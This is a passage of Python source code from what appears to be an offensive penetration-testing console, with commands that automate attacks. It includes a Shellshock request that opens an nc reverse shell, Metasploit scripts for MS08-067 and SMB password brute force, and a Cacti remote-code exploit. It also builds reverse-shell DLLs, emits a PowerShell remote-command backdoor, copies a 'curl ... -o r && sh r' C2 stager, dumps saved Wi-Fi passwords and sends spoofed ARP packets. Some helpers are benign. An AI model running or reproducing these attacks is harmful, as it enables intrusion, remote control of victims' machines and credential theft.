        - line: A string that may contain additional options to modify the scanning behavior.

        Function Flow:
        1. Default values are set for the target IP (rhost), port (port), and output directory (outputdir).
        2. The validity of the target (rhost) is checked using the `check_rhost` function.
        3. If no argument is provided in `line`, a `skipfish` command is constructed using the default values.
        4. If `line` starts with 'url', the URL configured in `self.params['url']` is retrieved and used to construct the `skipfish` command.
        5. If the URL is not configured and an attempt is made to use the 'url' option, an error message is printed, and the function exits.
        6. The constructed `skipfish` command is displayed on the console and executed using `os.system`.

        Note:
        - The function assumes that the `skipfish` tool is installed on the system.
        - The output of the scan is saved in the directory `sessions/{rhost}/skipfish/`.
        - The wordlist used by Skipfish is specified in `wordlist`.
        """
        
        port = 80
        s = ''
        
        wordlist = '/usr/share/skipfish/dictionaries/complete.wl'
        rhost = self.params['rhost']
        
        if not check_rhost(rhost):
            return
        outputdir = f'sessions/{rhost}/skipfish/'
        if not line:
            command = f"skipfish -o {outputdir} -S {wordlist} http{s}://{rhost}:{port}"
        else:
            if line.startswith('url'):
                url = self.params['url']
                if not url:
                    print_error(f"You need set the url if use the parametter url ex: {GREEN}set url http://url.ext/")
                    return
                command = f"skipfish -o {outputdir} -S {wordlist} {url}"
        print_msg(command)
        os.system(command)
        return

    def do_createdll(self,line):
        """
        Create a Windows DLL file using MinGW-w64 or a Blazor DLL for Linux.

        This function prompts the user to select between creating a 32-bit DLL, 
        a 64-bit DLL, or a Linux Blazor DLL. It first checks if MinGW-w64 is installed; 
        if not, it attempts to install it. The user must provide a filename for the 
        DLL, which will be created from the `sessions/rev.c` source file. 
        The function constructs the appropriate command to compile the DLL based on 
        the user's choice and executes it. If the user selects a 32-bit or 64-bit 
        compilation, the function also opens the `rev.c` file in a text editor for 
        modifications before compilation. For option 3, it executes a script to create 
        a Blazor DLL using the local host (lhost) address to download the necessary payload.

        Parameters:
        - line (str): The name of the DLL file to be created.
                    Must be provided by the user.

        Usage:
        - Choose "1" for 32-bit, "2" for 64-bit, or "3" for creating a Linux Blazor DLL.
        - Ensure that shellcode is created beforehand using 
        the `lazymsfvenom` or `venom` options 13 or 14 
        to replace in `sessions/rev.c`.
        """
        lhost = self.params["lhost"]
        if not check_lhost(lhost):
            return
        print_msg(f"{RED}1) {BLUE}Win32 Bit, {RED}2) {CYAN}Win64 Bit {RED}3){GREEN} Linux Blazor dll")
        choice = input(f"    {MAGENTA}[?] Choice (1, 2 or 3): ")
        print_warn(f"Remeber: {GREEN}run lazymsfvenom {YELLOW}or {GREEN}venom {YELLOW} option 13 or 14, to create shellcode before! to replace in {RED}sessions/win/rev.c")
        if not is_binary_present("x86_64-w64-mingw32-gcc") or not is_binary_present("i686-w64-mingw32-gcc"):
            print_warn("mingw-w64 is not present in the system installing...")
            os.system("sudo apt install mingw-w64")
        if not line:
            print_error("You need pass the name of the ddl file")
            return

        if choice == "1":
            command = f"x86_64-w64-mingw32-gcc -shared -o sessions/{line} sessions/win/rev.c -lws2_32"
        elif choice == "2":
            command = f"i686-w64-mingw32-gcc -shared -o sessions/{line} sessions/win/rev.c -lws2_32"
        elif choice == "3":
            command = f"./sessions/lin/blazormalware.sh {lhost} {line}"
        
        if choice == "1" or choice == "2":
            cmd = "nano sessions/win/rev.c"
            print_msg(f"Attemp to: {cmd}")
            os.system(cmd)

        print_msg(f"Try... {command}")
        os.system(command)
        cmd = f"curl -o {line} http://{lhost}/{line}"
        copy2clip(cmd)
        return

    def do_seo(self, line):
        """
        Performs a web seo fingerprinting scan using `lazyseo.py`.

        1. Executes the `lazyseo.py` command to identify h1,h2,links,etc used by the target web application.

        :param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
        :param rhost: The target web host to be scanned, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually perform web seo fingerprinting, use the following command:
            lazyseo.py <target_host>

        Replace `<target_host>` with the URL or IP address of the web application you want to scan.

        For example:
            lazyseo.py example.com
        """

        if not self.params["rhost"]:
            print_error(f"rhost must be set{RESET}")
            return
        rhost = self.params["rhost"]
        print_msg(f"Try... python3 modules/lazyseo.py http://{rhost}{RESET}")
        os.system(f"python3 modules/lazyseo.py http://{rhost}")
        return

    def do_padbuster(self, line):   
        """
        Execute the PadBuster command for padding oracle attacks.

        This function constructs and executes a PadBuster command to perform
        a padding oracle attack on the specified URL. It requires the user
        to provide a URL, a cookie with a hash, a plaintext value to compare, 
        and a specific byte position to attack.

        Parameters:
        - line (str): The input line containing the cookie, plaintext, and byte 
                    position. Expected format: 'cookie=<HASH> plaintext <byte_position>'.

        Functionality:
        - The function first checks if a URL is set in the parameters.
        - It then validates that the correct number of arguments is provided.
        - If the arguments are valid, it constructs the PadBuster command and executes it.
        - The command is also copied to the clipboard for convenience.

        Usage Example:
        - set url http://target.com
        - padbuster auth=<HASH> user=admin 8
        """
        url = self.params["url"]
        if not url:
            print_error(f"You need set the url using: {GREEN}set url http://url.com ")
            return
        args = line.split(" ")
        if len(args) != 3:
            print_error(f"You need pass the cookie like auth=<HASH> and plaintext like user=admin example:{GREEN} padbuster auth=b24dx2LYTEGrIsIsComEb4Ck user=admin 8")
            return
        elif len(args) == 3:
            cookie = args[0].split("=")
            plaintext = args[1]
            number = args[2]
            command = f"padbuster {url} '{cookie[1]}' {number} -cookie '{args[0]}' -plaintext '{plaintext}'" 
            copy2clip(command)
            os.system(command)
            return
        else:
            print_error("wrong number of parameters.")
            return

    def do_smbattack(self, line):
        """
        Scans for hosts with SMB service open on port 445 in the specified target network.

        This function performs the following actions:
        1. Scans the specified subnet for hosts with an open SMB port (445).
        2. Sets up a Metasploit handler to listen for reverse connections.
        3. Attempts to exploit the Conficker vulnerability on each identified host.
        4. Optionally conducts a brute-force attack on SMB using the provided password file.

        Parameters:
        line (str): The command line input for the smbattack function, 
                    though not used directly in this implementation.

        Returns:
        None
        """
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return
        lport = self.params["lport"]
        if not check_lport(lport):
            return

        lhost = self.params["lhost"]
        lport = self.params["lport"]
        passwd_file = self.params["wordlist"]
        file = "sessions/meta.rc" 

        def find_tgts(subnet):
            """
            Finds and returns a list of target hosts with port 445 open in the specified subnet.

            Args:
                subnet (str): The subnet to scan, e.g., '192.168.1.0/24'.

            Returns:
                list: A list of IP addresses where port 445 is open.
            """            
            nmap_proc = NmapProcess(subnet, options="-p 445 --open")
            nmap_proc.run()
            nmap_report = NmapParser.parse(nmap_proc.stdout)

            hosts = []
            for host in nmap_report.hosts:
                if host.is_up() and 'tcp' in host.services and 445 in host.services['tcp'] and host.services['tcp'][445].state == "open":
                    print_msg(f"[+] Found Target Host: {host.address}")
                    hosts.append(host.address)
            return hosts

        def setup_handler(config_file, lhost, lport):
            """
            Sets up a Metasploit multi/handler configuration in the given config file.

            Args:
                config_file (file-like object): The file object to write the Metasploit handler configuration to.
                lhost (str): The local host IP address to listen for incoming connections.
                lport (int): The local port number to listen for incoming connections.

            Writes:
                - Exploit configuration for Metasploit to the provided file.
            """

            config_file.write('use exploit/multi/handler\n')
            config_file.write('set payload windows/meterpreter/reverse_tcp\n')
            config_file.write(f'set LPORT {str(lport)}\n')
            config_file.write(f'set LHOST {lhost}\n')
            config_file.write('exploit -j -z\n')
            config_file.write('setg DisablePayloadHandler 0\n')

        def conficker_exploit(config_file, host, lhost, lport):
            """
            Configures and writes a Metasploit exploit for the Conficker vulnerability to the given config file.

            Args:
                config_file (file-like object): The file object to write the Metasploit exploit configuration to.
                host (str): The target host IP address to exploit.
                lhost (str): The local host IP address to listen for incoming connections.
                lport (int): The local port number to listen for incoming connections.

            Writes:
                - Exploit configuration for the Conficker vulnerability (MS08-067) to the provided file.
            """            
            config_file.write('use exploit/windows/smb/ms08_067_netapi\n')
            config_file.write(f'set RHOST {str(host)}\n')
            config_file.write('set payload windows/meterpreter/reverse_tcp\n')
            config_file.write(f'set LPORT {str(lport)}\n')
            config_file.write(f'set LHOST {lhost}\n')
            config_file.write('exploit -j -z\n')

        def smb_brute(config_file, host, passwd_file, lhost, lport):
            """
            Configures and writes a Metasploit SMB brute force exploit for the given host to the provided config file.

            Args:
                config_file (file-like object): The file object to write the Metasploit exploit configuration to.
                host (str): The target host IP address to exploit.
                passwd_file (str): Path to a file containing a list of passwords to use for brute force.
                lhost (str): The local host IP address to listen for incoming connections.
                lport (int): The local port number to listen for incoming connections.

            Writes:
                - Exploit configuration for SMB brute force (using the psexec module) to the provided file for each password in the passwd_file.
            """            
            username = 'Administrator'
            with open(passwd_file) as file:
                for password in file.readlines():
                    password = password.strip('\n').strip('\r')
                    config_file.write('use exploit/windows/smb/psexec\n')
                    config_file.write(f'set SMBUser {str(username)}\n')
                    config_file.write(f'set SMBPass {str(password)}\n')
                    config_file.write(f'set RHOST  {str(host)}\n')
                    config_file.write('set payload windows/meterpreter/reverse_tcp\n')
                    config_file.write(f'set LPORT {str(lport)}\n')
                    config_file.write(f'set LHOST {lhost}\n')
                    config_file.write('exploit -j -z\n')

        with open(file, 'w') as metarc_file:
            tgt_list = find_tgts(rhost)
            setup_handler(metarc_file, lhost, lport)

            for tgt_host in tgt_list:
                conficker_exploit(metarc_file, tgt_host, lhost, lport)
                if passwd_file:
                    smb_brute(metarc_file, tgt_host, passwd_file, lhost, lport)
        command = f'msfconsole -r {file}'
        copy2clip(command)
        os.system(command)
        return

    def do_cacti_exploit(self, line):
        """
        Automates the exploitation of the Cacti version 1.2.26 vulnerability 
        using the multi/http/cacti_package_import_rce exploit.

        This function performs the following actions:
        1. Sets up a Metasploit handler to listen for reverse connections.
        2. Attempts to log in to the Cacti instance with provided credentials.
        3. Checks if the target is vulnerable and uploads the malicious payload.
        4. Triggers the payload to obtain a Meterpreter session.

        Parameters:
        line (str): The command line input for the cacti exploit function, 
                    though used directly in this implementation to set password.

        Returns:
        None
        """
        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        
        if not check_rhost(rhost):
            return
        if not check_lhost(lhost):
            return
        if not check_lport(lport):
            return
        file = "sessions/meta.rc"
        
        def setup_handler(config_file, lhost, lport):
            """
            Sets up a Metasploit multi/handler exploit configuration in the provided config file.

            Args:
                config_file (file-like object): The file object to write the Metasploit handler configuration to.
                lhost (str): The local host IP address to listen for incoming connections.
                lport (int): The local port number to listen for incoming connections.

            Writes:
                - Configuration commands to the file to set up the Metasploit handler with the specified payload and options.
                - The payload used is `php/meterpreter/reverse_tcp`.
                - The handler is configured to listen on the provided LHOST and LPORT.
                - Starts the exploit with the `-j -z` options.
            """

            config_file.write('use exploit/multi/handler\n')
            config_file.write('set payload php/meterpreter/reverse_tcp\n')
            config_file.write(f'set LPORT {str(lport)}\n')
            config_file.write(f'set LHOST {lhost}\n')
            config_file.write('exploit -j -z\n')
            #config_file.write('setg DisablePayloadHandler 1\n')

        def cacti_exploit(config_file, host):
            """
            Configures an exploit for the Cacti Package Import Remote Code Execution vulnerability in the provided config file.

            Args:
                config_file (file-like object): The file object to write the Metasploit exploit configuration to.
                host (str): The target host IP address where the Cacti service is running.

            Writes:
                - Configuration commands to the file to set up the Metasploit exploit for the Cacti Package Import RCE.
                - Sets the RHOST to the target host IP.
                - Sets the payload options including the LHOST, USERNAME, and PASSWORD.
                - Starts the exploit with the `-j -z` options.
            """

            config_file.write('use exploit/multi/http/cacti_package_import_rce\n')
            config_file.write(f'set RHOST {host}\n')
            config_file.write(f'set LHOST {lhost}\n')            
            config_file.write('set USERNAME admin\n')
            config_file.write(f'set PASSWORD {line}\n')
            config_file.write('exploit -j -z\n')

        with open(file, 'w') as metarc_file:
            setup_handler(metarc_file, lhost, lport)
            cacti_exploit(metarc_file, rhost)

        command = f'msfconsole -r {file}'
        copy2clip(command)
        os.system(command)
        return
        
    def do_smalldic(self, list):
        """
        Handles the creation of temporary files for users and passwords based on a small dictionary.

        This function prompts the user to decide whether to use a small dictionary for generating 
        user and password lists. If the user agrees, it loads the credentials from a JSON file and 
        writes them into temporary files. If the user declines, the process is aborted.

        Parameters:
        list (str): Not used in this function, but kept for compatibility with cmd command input.

        Returns:
        None
        """        
        use_small_dict = input(f"    {CYAN}[?] Do you want to use the small dictionary? (yes/no): ").strip().lower()

        if use_small_dict == "yes":
            path = os.getcwd()
            smalldic = f"{path}/modules/credentials.json"
            with open(smalldic, 'r') as f:
                data = json.load(f)
            
            print_msg("Create temporary files for users")
            with open('sessions/small_users.txt', 'w') as f:
                for username in data["usernames"]:
                    if username:
                        f.write(username + '\n')
            print_msg("Create temporary files for passwords")
            with open('sessions/small_passwords.txt', 'w') as f:
                for password in data["passwords"]:
                    if password:
                        f.write(password + '\n')
            print_msg("Done.")
        else:
            print_warn("Abort. smalldic")
        return

    def do_wifipass(self, line):
        """
        This function generates a PowerShell script that retrieves saved Wi-Fi passwords on a Windows system.
        The script gathers the Wi-Fi profiles, extracts their passwords, and saves the information in a text file
        named 'wifi_passwords.txt' in the directory where the script is executed. The generated PowerShell command
        is copied to the clipboard for easy execution.

        Parameters:
        line (str): This parameter is not used within the function but is required for the command interface.

        The function does not return any value.
        """
        command = '''
        $currentDir = Get-Location
        $networks = netsh wlan show profiles
        $networkNames = $networks | Select-String -Pattern '(?:Perfil\s*:\s)(.*)' | ForEach-Object { $_.Matches[0].Groups[1].Value }
        $results = @()
        foreach ($networkName in $networkNames) {
            $command = 'netsh wlan show profile "' + $networkName + '" key=clear'
            $currentResult = Invoke-Expression $command
            $results += $currentResult
        }
        $result = $results -join "`n"
        $outputFile = Join-Path $currentDir "wifi_passwords.txt"
        $result | Out-File -FilePath $outputFile -Encoding utf8
        Write-Host "Wi-Fi passwords saved to $outputFile"'''.replace("        ",'')
        copy2clip(command)
        return

    def do_shellshock(self, line):
        """
        Executes a Shellshock attack against a target.

        This function constructs and sends a specially crafted HTTP request designed to exploit 
        the Shellshock vulnerability on a target server. The payload is embedded in the 
        'User-Agent' header, and when executed, it will open a reverse shell connection to 
        the attacker's machine.

        Parameters:
        - lport: Local port for the reverse shell connection, retrieved from self.params.
        - lhost: Local host for the reverse shell connection, retrieved from self.params.

        The function first validates the local host (lhost) and local port (lport) using 
        check_lhost() and check_lport(). If either validation fails, the function returns 
        without proceeding.

        If the validation passes, the payload is created using the format:
        '() { :; }; /bin/bash -c "nc -v {rhost} {lport} -e /bin/bash -i"',
        where rhost is the remote target's IP address and lport is the specified local port.

        The function then attempts to send a GET request to the target URL (args.target) 
        with the crafted payload in the 'User-Agent' header. The server's response is captured 
        and printed using print_msg().

        If any error occurs during the request, an error message is displayed using print_error().

        Returns:
        None
        """
        lport = self.params["lport"]
        lhost = self.params["lhost"]
        url = self.params["url"]
        if not check_lhost(lhost):
            return

        if not check_lport(lport):
            return

        if not url:
            print_error(f"use {GREEN}set url http://example.com {CYAN}to set url")
            return

        payload = '() {{ :; }}; /bin/bash -c "nc -v {} {} -e /bin/bash -i"'.format(lhost, lport)
        print_msg(f"Constructed payload: {payload}")
        try:
            print_msg("Attacking {}".format(url))
            headers = {"Content-type": "application/x-www-form-urlencoded",
                    "User-Agent": payload}
            req = requests.get(url, headers=headers).text
            with tempfile.NamedTemporaryFile(delete=False, suffix='.html') as output_file:
                output_file.write(req.encode('utf-8'))  
                temp_file_name = output_file.name  
            subprocess.run(['batcat', temp_file_name])
            os.remove(temp_file_name)
        except KeyError as e:
            print_error(f"KeyError: {e}")
        except Exception as e:
            print_error(f"An unexpected error occurred: {e}")
        print_warn(f"Attack done, using headers: {headers}")
        return

    def do_powerserver(self, line):
        """
        This function generates a PowerShell script that retrieves reverse shell over http on a Windows system.
        The script generated PowerShell reverse shell to execute command by curl command
        is copied to the clipboard for easy execution.

        Parameters:
        line (str): This parameter is used to get the port to create the listener

        The function does not return any value.
        Example of use: curl -X POST http://victim:8080/ -d "Get-Process"
        """
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return
        if not line:
            print_error("You need to specify the port, for example: powershell 5555.")
            return
        command = '''
        $listener = New-Object System.Net.HttpListener

        $listener.Prefixes.Add("http://*:8080/")

        $listener.Start()
        Write-Host "Servidor iniciado. Escuchando en http://*:8080/"

        try {
            while ($true) {
                $context = $listener.GetContext()
                $request = $context.Request
                $response = $context.Response

                $body = New-Object System.IO.StreamReader($request.InputStream)
                $command = $body.ReadToEnd()
                $body.Close()

                try {
                    $output = Invoke-Expression $command
                    $response.StatusCode = 200
                    $response.ContentType = "text/plain"
                    $outputBytes = [System.Text.Encoding]::UTF8.GetBytes($output)
                    $response.ContentLength64 = $outputBytes.Length
                    $response.OutputStream.Write($outputBytes, 0, $outputBytes.Length)
                } catch {
                    $response.StatusCode = 500
                    $errorMessage = $_.Exception.Message
                    $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("Error: $errorMessage"), 0, $errorMessage.Length)
                }

                $response.OutputStream.Close()
            }
        } catch {
            Write-Host "Ocurrió un error: $_"
        } finally {
            $listener.Stop()
        }
        '''.replace("        ",'').replace("8080",line)
        copy2clip(command)
        
        print_warn(f'Example of use: curl -X POST http://{rhost}:{line}/ -d "Get-Process"')
        return

    def do_morse(self,line):
        """Interactive Morse Code Converter.

        This function serves as an interface for converting text to Morse code and vice versa. 
        It provides a menu with the following options:
        
        1️⃣  Convert text to Morse code.
        2️⃣  Convert Morse code to text.
        0️⃣  Exit the program.

        When the function is called, it runs an external script (`morse.py`) that handles 
        the conversion processes. The function also manages keyboard interruptions 
        gracefully, allowing the user to exit the program cleanly.

        Arguments:
        line (str): This argument is reserved for future enhancements but is currently not used.

        Returns:
        None

        Notes:
        - Ensure that the `morse.py` module is located in the `modules` directory and is executable.
        - The function captures `KeyboardInterrupt` to allow safe exit from the Morse code converter.

        Example:
        >>> do_morse("")

        See Also:
        - `morse.py`: The script that contains the logic for Morse code conversions.
        """
        try:
            os.system("python3 modules/morse.py")
        except KeyboardInterrupt:
            print_warn("Exiting...")

    def do_waybackmachine(self, line):
        """
        Fetch URLs from the Wayback Machine for a given website.
        The URL is taken from line. If the URL is not provided, an error is printed.
        The limit of results is taken from self.params["limit"] if provided; otherwise, defaults to 10.
        Results are printed directly to the console.
        """
        if not line:
            print_error("you need pass the search keyword as argument")
            return
        url = line
        limit = self.params.get("limit", 10)

        # Constructing the request URL
        wayback_url = (
            f"https://web.archive.org/cdx/search?url={url}&matchType=prefix&collapse=urlkey&output=text&fl=original&filter=&limit={limit}"
        )

        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/68.0"
        }
        os.system("clear")
        
        try:
            r = requests.get(wayback_url, headers=headers)
            r.raise_for_status()
            results = r.text
         
            

            print_msg(f"{GREEN}############ All websites from the WayBack Machine ###########")

            # Printing the results
            for j, i in enumerate(results.split(), start=1):
                print_msg(f"{j} : {i}")
            print_msg(f"{CYAN}https://web.archive.org/web/*/{line}/*")
            print_msg(f"{CYAN}############## Thanks for using LazyOwn! ###############")

        except requests.exceptions.RequestException as e:
            print_warn(f"Warning: Failed to fetch data from the Wayback Machine. {str(e)}")
    
    def do_c2(self, line):
        """
        Handles the execution of a C2 (Command and Control) server setup command.

        This function performs the following tasks:
        1. Retrieves and validates the local host (lhost) and local port (lport) parameters.
        2. Checks if the required file `modules/run` exists.
        3. Reads the content of the `modules/run` file, replaces placeholders with actual values (lport, line, lhost), 
        and copies the updated content to the clipboard.
        4. Prompts the user to start the C2 server, and if confirmed, executes the server command.
        5. Provides a warning about shutting down the server.

        Args:
            line (str): The victim ID or command line to be used by the C2 server.

        Returns:
            None

        Raises:
            None

        Example:
            c2 victim-1

        Notes:
            - Ensure that the `lhost` and `lport` parameters are valid before calling this function.
            - The `modules/run` file must exist and be correctly formatted.
            - The server command is executed using `os.system`, which may require additional handling for security.
        """
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        path = os.getcwd()
        file = f"{path}/modules/run"
        
        if not check_lhost(lhost):
            return

        if not check_lport(lport):
            return
        
        if not line:
            print_error("You need to specify the victim-id, for example: c2 victim-1.")
            return
        
        if not is_exist(file):
            return

        with open(file, 'r') as f:
            content = f.read()

        content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
        server = f"cd modules && python3 lazyc2.py {lport}"
        
        with open("sessions/r", 'w+') as f:
            f.write(content)
        print_msg(content)
        copy2clip(f"curl http://{lhost}/r -o r && sh r")
        choice = input(f"    {CYAN}[?] start C2 Server ? (yes/no): ")
        if choice == 'yes':
            os.system(server)
            print_warn(f"Shutdown Server C&C at port:{RED} {lport}")
        return

    def do_kick(self, line):
        """
        Handles the process of sending a spoofed ARP packet to a specified IP address with a given MAC address.

        This function performs the following steps:
        1. Executes a command to list current ARP entries and prints the IP and MAC addresses.
        2. Prompts the user to input the target IP and MAC address in a specified format.
        3. Parses the provided input to extract the IP and MAC addresses.
        4. Sets up default values for the gateway IP, local MAC address, and network interface.
        5. Creates an ARP packet with the specified target IP and MAC address.
        6. Sends the ARP packet using the specified network interface.
        7. Prints a confirmation message indicating that the spoofing packet has been sent.

        Args:
            line (str): Input line for the command, which is not used directly in this function.

        Raises:
            Exception: If any error occurs during the execution of the function.
        """        
        try:
            check_sudo()
            command="""sudo arp -a | awk '{print "IP: " $2 " MAC: " $4}'"""
            print_msg(command)
            os.system(command)
            choice = input(f"    {CYAN}[!] Set up ip and mac Example (IP: (192.168.1.100) MAC: de:ad:be:ef:00:00): {RESET}")
            target_ip, target_mac = parse_ip_mac(choice)
            if target_ip and target_mac:
                print(f"IP: {target_ip}, MAC: {target_mac}")       
            gateway_ip = "192.168.1.1" 
            my_mac = "00:11:22:33:44:55" 
            print_msg("Available Interfaces: ")
            command = "ip link show | grep -E '^[0-9]+: ' | awk -F': ' '{print $2}'"
            os.system(command)
            choice = input("    [!] Enter the interface to use (Default: wlp2s0): ")
            if not choice:
                iface = "wlp2s0"
            else:
                iface = choice

            packet = create_arp_packet(my_mac, gateway_ip, target_ip, target_mac)
            send_packet(packet, iface)
            print(f"Sent spoofing packet to {target_ip} with MAC {target_mac}")
        
        except Exception as e:
            print(f"Error: {e}")
    
    def do_sqli(def_func, line):
        """
        Asks the user for the URL, database, table, and columns, and then executes the Python script 
        'modules/lazybsqli.py' with the provided parameters.

        Parameters:
        - def_func: Function to execute (not used in this example).
        - line: Command line or additional input (not used in this example).

        Example:
        - do_bsqli(None, None)
        """
        
        # Solicitar parámetros al usuario
        url = input("Enter the URL (e.g., http://example.com/page.php): ")
        db = input("Enter the name of the database: ")
        table = input("Enter the name of the table: ")
        col = input("Enter the column names separated by commas (e.g., username,password): ")

        # Preparar el comando para ejecutar el script con los parámetros proporcionados
        command = [
            'python3', 'modules/lazysqli.py',
            '--url', url,
            '--db', db,
            '--table', table,
            '--col', col
        ]

        # Ejecutar el comando
        try:
            subprocess.run(command, check=True)
        except subprocess.CalledProcessError as e:
            print_error(f"Script Error : {e}")
        except Exception as e:
            print_error(f"Unexpected Error: {e}")
    
    def do_sshkey(self, line)            :
        """
        Generates an SSH key pair with RSA 4096-bit encryption. If no name is provided, it uses 'lazyown' by default.
        The keys are stored in the 'sessions/' directory.

        Parameters:
        - line: The name of the key file. If empty, 'lazyown' is used as the default.

        Example:
        - do_sshkey(None)  # Generates 'lazyown' key
        - do_sshkey("custom_key")  # Generates 'custom_key' key
        """
        if not line:
            print_warn("usign lazyown by default")
            line = "lazyown"

        command = f"ssh-keygen -t rsa -b 4096 -f sessions/{line}"
        print_msg(f"Try... {command}")
        os.system(command)

    def do_crunch(self, line):
        """
        Generate a custom dictionary using the `crunch` tool.

        This function creates a wordlist with a specified length using the `crunch` command. 
        It allows the user to specify a custom character pattern for the wordlist.

        :param line: The length of the strings to be generated (e.g., '6' for 6-character strings).
                    If not provided, the function will prompt an error message.

        :returns: None

        Example usage:
        >>> crunch 6
        This will generate a wordlist with all possible combinations of 6-character strings using the default pattern.

        Additional notes:
        - If no custom pattern is provided, the function uses a default pattern: "0123456789abcdefghijklmnñopqrstuvxyz,.-#$%@"
        - The output is saved in the `sessions/` directory with the filename format `dict_<length>.txt`
        """
        if not is_binary_present("crunch"):
            print_warn("Installing crunch...")
            os.system("sudo apt install crunch -y")

        if not line:
            print_error(f"You need to pass the length as an argument. Example: {GREEN}crunch 6{reset}")
            return

        default_pattern = "0123456789abcdefghijklmnñopqrstuvxyz,.-#$%@"
        print_msg(f"Default pattern: {default_pattern}")
        
        choice_patt = input(f"    [?] Press Enter to use the default pattern, or enter a custom pattern: ")
        
        pattern = choice_patt if choice_patt else default_pattern
        print_msg(f"Using pattern: {pattern}")
        
        command = f"crunch {line} {line} {pattern} -o sessions/dict_{line}.txt"
        os.system(command)

        return

    def do_malwarebazar(self, line):
        """
        Fetches and displays malware information from the MalwareBazaar API based on the given tag.

        Args:
            line (str): The tag used to query the MalwareBazaar API.

        This function performs the following steps:
        1. Constructs a URL to query the MalwareBazaar API with the provided tag.
        2. Uses `curl` to send a POST request to the API and saves the response in a JSON file.
        3. Checks if the file was successfully created and exists.
        4. Loads the JSON data from the file.
        5. Checks the `query_status` field to determine if there are results.
            - If `no_results`, prints a warning message and exits the function.
        6. Iterates through the list of file information provided in the response.
            - Prints detailed information about each file, including:
                - File name
                - File type
                - File size
                - Hashes (SHA-256, SHA-1, MD5)
                - First seen date
                - Signature
                - Tags
                - ClamAV results (if any)
                - Downloads and uploads count
        7. Deletes the temporary file used to store the API response.

        Returns:
            None
        """        
        file = f"sessions/{line}.json"
        command = f'curl -o {file} -X POST -d "query=get_taginfo&tag={line}&limit=50" https://mb-api.abuse.ch/api/v1/'
        run(command)

        if not is_exist(file):
            return

        with open(file, 'r') as f:
            data = json.load(f)
            
        if data.get("query_status") == "no_results":
            print_warn("Warning: No results found.")
            return

        for file_info in data['data']:
            print_msg(f"{BG_RED}{YELLOW}===== {MAGENTA}File Info {YELLOW}=====")
            print_msg(f"File Name: {BLUE}{file_info.get('file_name')}")
            print_msg(f"File Type: {BLUE}{file_info.get('file_type')}")
            print_msg(f"File Size: {BLUE}{file_info.get('file_size')} bytes")
            print_msg(f"{BG_YELLOW}{RED}SHA-256: {BLUE}{file_info.get('sha256_hash')}")
            print_msg(f"SHA-1: {BLUE}{file_info.get('sha1_hash')}")
            print_msg(f"MD5: {BLUE}{file_info.get('md5_hash')}")
            print_msg(f"First Seen: {BLUE}{file_info.get('first_seen')}")
            print_msg(f"Signature: {BLUE}{file_info.get('signature')}")
            print_msg(f"Tags: {BLUE}{', '.join(file_info.get('tags', []))}")
            
            intelligence = file_info.get('intelligence', {})
            clamav_results = intelligence.get('clamav', [])
            if clamav_results:
                print_msg(f"ClamAV Results: {', '.join(clamav_results)}")
            print_msg(f"Downloads: {BLUE}{intelligence.get('downloads')}")
            print_msg(f"Uploads: {BLUE}{intelligence.get('uploads')}")
            print_msg(f"{BG_YELLOW}{RED}====================={RESET}\n")

        run(f"rm {file}")

    def do_download_malwarebazar(self, line):
        """Download a malware sample from MalwareBazaar using its SHA256 hash.

        This function allows the user to download a malware sample from MalwareBazaar by providing 
        the SHA256 hash of the desired file. If the hash is not provided as an argument, the function 
        will prompt an error message indicating the correct usage. The downloaded malware sample 
        will be saved as a zipped file (`malware.zip`) and will be password protected.

        Arguments:
        line (str): The SHA256 hash of the malware sample to be downloaded.

        Returns:
        None

        Example:
        >>> download_malwarebazar 094fd325049b8a9cf6d3e5ef2a6d4cc6a567d7d49c35f8bb8dd9e3c6acf3d78d

        Notes:
        - Ensure that the SHA256 hash provided is correct and that it corresponds to a file available 
        on MalwareBazaar.
        - The downloaded file will be password protected using the password "infected".
        - To obtain the SHA256 hash of malware samples, refer to the `help malwarebazar` command.

        See Also:
        - `run(command)`: Utility function used to execute the command for downloading the malware.
        """
        if not line:
            print_error(f"You need pass the hash of malware as an argument example {GREEN}download_malwarebazar 094fd325049b8a9cf6d3e5ef2a6d4cc6a567d7d49c35f8bb8dd9e3c6acf3d78d {BLUE} To get hash of malware see {GREEN}help malwarebazar")
            return
        file = "sessions/malware.zip"
        command = f'curl -X POST -d "query=get_file&sha256_hash={line}" -o {file} https://mb-api.abuse.ch/api/v1/'
        run(command)
        print_msg(f'Please note that any malware sample you download from MalwareBazaar will be zipped (malware.zip) and password protected using the password "infected" (without "").')
        out = run(f"file {file}")
        print_msg(out)
        return


    def do_sslscan(self, line):
        """
        Run an SSL scan on the specified remote host.

        This function initiates an SSL scan on a specified remote host (`rhost`)
        using the `sslscan-singleip.sh` script. If a specific port is provided in the
        `line` argument, the scan will target that port; otherwise, it will scan
        all available ports.

        Parameters:
        line (str): The port number to scan (optional). If omitted, the scan will target all ports.

        Internal Variables:
        rhost (str): The remote host IP address or hostname extracted from the `params` attribute.

        Returns:
        None

        Example Usage:
        - To scan all ports on the specified `rhost`: `sslscan`
        - To scan a specific port (e.g., port 443) on `rhost`: `sslscan 443`

        Note:
        - The `check_rhost()` function is used to validate the `rhost` before running the scan.
        - The `sslscan-singleip.sh` script must be present in the `sessions` directory.
        """
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return

        if not line:
            port = ""
        else:
            port = ":"+line

        command = f"cd sessions && ./sslscan-singleip.sh {rhost}{port}"
        print_msg(f"Attempting to execute: {command}")
        os.system(command)
        return

    def do_cewl(self, line):
        """
        This function constructs and executes a command for the 'cewl' tool.
        It first checks if the 'url' parameter is set. If not, it prints an error message.
        If the 'url' is set, it extracts the domain from the URL using the get_domain function.
        Then, it constructs a 'cewl' command with the specified parameters and prepares it for execution.
        
        Scan to a depth of 2 (-d 2) and use a minimum word length of 5 (-m 5), save the words to a file (-w docswords.txt), targeting the given URL (https://example.com):
        
        Parameters:
        line (str): The command line input for this function.

        Expected self.params keys:
        - url (str): The URL to be used for the 'cewl' command.

        Example usage:
        - set url http://example.com
        - do_cewl
        """        
        extra = ""
        url = self.params["url"]
        if not url:
